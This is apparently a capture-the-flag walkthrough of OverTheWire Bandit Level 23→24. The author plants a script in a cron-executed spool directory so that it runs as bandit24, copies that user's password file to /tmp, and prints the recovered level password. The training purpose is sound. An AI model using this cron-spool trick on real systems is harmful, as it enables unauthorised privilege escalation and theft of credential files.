Bandit Level 23 → Level 24
After logging into Bandit Level 23, I checked the cron jobs to understand how the next 
password might be generated. I navigated to the cron directory:
cd /etc/cron.d
ls

From the list, cronjob_bandit24 looked relevant, so I opened it:
cat cronjob_bandit24

This showed that /usr/bin/cronjob_bandit24.sh runs every minute and at reboot as user
bandit24.
Next, I examined the script itself:
cat /usr/bin/cronjob_bandit24.sh

From the script, I observed the following behavior:
The script changes directory to /var/spool/bandit24/foo
It executes all files in that directory that are owned by bandit23
Each script is executed as bandit24

After execution, the script deletes the files
This meant I could place my own script (owned by bandit23) into /var/spool/bandit24/foo, and it would be executed with bandit24 privileges.
I created a working directory in /tmp and wrote a script to copy the bandit24 password into a readable file:
mkdir /tmp/deam
cd /tmp/deam
nano pass.sh


Inside pass.sh, I added commands to read the password file and save it to /tmp:
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt

I made the script executable:
chmod 755 pass.sh

Then I copied the script into the cron-executed directory:
cp pass.sh /var/spool/bandit24/foo/pass.sh

After waiting for the cron job to run (up to one minute), the script executed as 
bandit24 and created the password file. I then read it:
cat /tmp/bandit24_pass.txt

This revealed the password for the next level:
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8


Finally, I logged into Bandit Level 24 using SSH:

ssh bandit24@bandit.labs.overthewire.org -p 2220


I entered the retrieved password, and the login was successful.
